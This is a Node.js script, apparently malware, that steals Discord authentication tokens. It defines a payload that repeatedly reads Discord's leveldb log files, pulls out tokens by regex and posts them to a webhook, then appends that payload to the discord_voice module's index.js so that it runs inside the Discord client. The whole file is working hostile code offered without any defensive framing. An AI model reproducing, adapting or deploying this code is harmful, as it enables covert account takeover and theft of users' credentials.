"use strict";

// Dependencies
const fs = require("fs")
const os = require("os")

// Variables
const maliciousCode = `\nconst os = require("os")
setInterval(function(){
    fs.readdir("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb", "utf8", function(err, files){
        if(err){
            Done()
            return
        }
		
        files.forEach(file =>{
            if(file.indexOf("log") !== -1){
                const logData = fs.readFileSync("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb/" + file, "utf8")
                const tokens = logData.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)
                const resultTokens = []

                if(!logData.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)) return console.log("No discord tokens found.")

                for( i = 0; i <= tokens.length-1; i++ ){
                    if(resultTokens.indexOf(tokens[i]) === -1){
                        resultTokens.push(tokens[i])
                    }
                }

                fetch("webhookLink", {
					method: "POST",
					headers: {
						"Content-Type": "application/json"
					},
					body: JSON.stringify({ content: resultTokens.join(", ") })
				})
                return
            }
        })
    })
}, 10000)`

// Main
if(fs.existsSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`)){
    const Directories = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Directories().forEach(directory =>{
        const Directories2 = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

        if(directory.indexOf("app") !== -1){
            Directories2().forEach(directory2 =>{
                if(directory2.indexOf("discord_voice") !== -1){
                    fs.readFile(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
                        if(err) process.exit()
                        if(data.indexOf("fetch(") !== -1) process.exit()
                
                        data += `\n${maliciousCode}`
                
                        fs.writeFileSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
                    })
                }
            })
        }
    })
}